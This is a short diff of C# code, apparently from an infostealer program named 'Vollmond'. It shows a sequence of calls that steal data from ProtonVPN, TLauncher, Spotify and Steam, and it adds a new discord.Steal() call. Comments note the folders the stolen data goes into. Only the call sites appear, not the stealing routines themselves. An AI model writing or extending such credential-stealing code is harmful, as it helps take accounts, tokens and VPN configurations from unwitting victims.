@@ -33,6 +33,7 @@ namespace Vollmond
                 ProtonVPN.StealConnectionConfig(); // Makes a directory "VPN" (Nota Bene)
                 Tlauncher.Steal(); // Makes a directory "Minecraft" (Nota bene)
                 Spotify.Steal();
+                discord.Steal();
                 Steam.Steal(); // Makes a directory "games" (Nota bene)
 
 
